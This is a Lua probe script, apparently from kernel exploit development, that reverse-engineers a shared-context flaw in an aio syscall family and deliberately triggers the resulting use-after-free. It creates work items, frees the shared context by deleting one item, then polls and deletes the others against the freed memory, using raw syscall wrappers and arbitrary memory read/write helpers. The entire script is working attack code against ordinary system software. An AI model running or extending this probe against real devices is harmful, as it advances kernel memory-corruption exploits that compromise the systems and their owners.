-- CRASH_CLASS: HIGH
-- PROBE 504a: do the work items of one aio object share a single context?
--
-- 13.60 create 0x3b2080: every work item W_i gets [W+0x18] = C (one context for the
-- whole object), while [W_i]=id|(i<<16), [W_i+0x10]=&D[i], [W_i+0x20]=S_i (flags
-- 0x1000) or one shared S. Delete 0x3afeb7 takes C=[W+0x18], releases [C+0x10],
-- frees C and only clears [W_i+0x18]. So after deleting item 0 the other items
-- still point at the freed context. This probe checks the shape without a race.

print("=== PROBE 504a: aio shared context ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local sc_c, sc_p, sc_d = make_syscall(669), make_syscall(664), make_syscall(662)
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
local function fill(page, val, n)
    for o = 0, (n or 0x1000) - 4, 4 do wr(page + o, val) end
end

local DATA = memory.alloc(0x1000)
local OUT  = memory.alloc(0x1000)
local IDS  = memory.alloc(0x1000)
local RES  = memory.alloc(0x1000)
fill(DATA, 0); fill(OUT, 0); fill(RES, 0x77777777)

local N = 4
local FLAGS = 0x1001
wr(OUT, 0)
local okc, retc = pcall(function() return sc_c(FLAGS, DATA, N, 1, OUT) end)
local base = rd(OUT)
print(string.format("create flags=%#x count=%d ok=%s ret=%d base=%d", FLAGS, N, tostring(okc), to_num(retc), base))
if base == 0 then print("=== DONE ===") return end

local function one_id(i) return base + i * 0x10000 end
for i = 0, N - 1 do
    wr(IDS, one_id(i)); fill(RES, 0x77777777, 4)
    local ok, r = pcall(function() return sc_p(IDS, 1, RES) end)
    print(string.format("poll id=%d (base|%d<<16) ok=%s ret=%d status=%08x", one_id(i), i, tostring(ok), to_num(r), rd(RES)))
end

local function del(i, tag)
    wr(IDS, one_id(i)); fill(RES, 0x77777777, 4)
    local ok, r = pcall(function() return sc_d(IDS, 1, RES) end)
    print(string.format("delete %s id=%d ok=%s ret=%d status=%08x", tag, one_id(i), tostring(ok), to_num(r), rd(RES)))
    return ok, to_num(r)
end

del(0, "item0")
print("-- now item1 still references the freed context --")
for i = 1, N - 1 do
    wr(IDS, one_id(i)); fill(RES, 0x77777777, 4)
    local okp, rp = pcall(function() return sc_p(IDS, 1, RES) end)
    print(string.format("poll after free id=%d ok=%s ret=%d status=%08x", one_id(i), tostring(okp), to_num(rp), rd(RES)))
    del(i, "item" .. i)
end
print("=== DONE (no crash) ===")
